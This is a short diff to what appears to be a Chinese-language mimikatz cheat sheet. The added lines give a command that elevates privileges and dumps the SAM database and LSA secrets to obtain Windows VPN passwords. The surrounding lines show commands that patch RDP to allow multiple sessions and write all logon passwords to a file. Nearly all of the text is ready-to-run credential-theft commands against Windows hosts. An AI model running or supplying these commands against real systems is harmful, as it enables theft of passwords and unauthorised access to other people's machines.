@@ -1,7 +1,9 @@
 `允许多用户登录`
     
     mimikatz.exe,执行ts::multirdp允许多用户远程登录 重启失效
-  
+`获取Windows VPN 密码`  
+
+    mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit
 `mimikatz执行结果输出到文件`
     
     C:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt
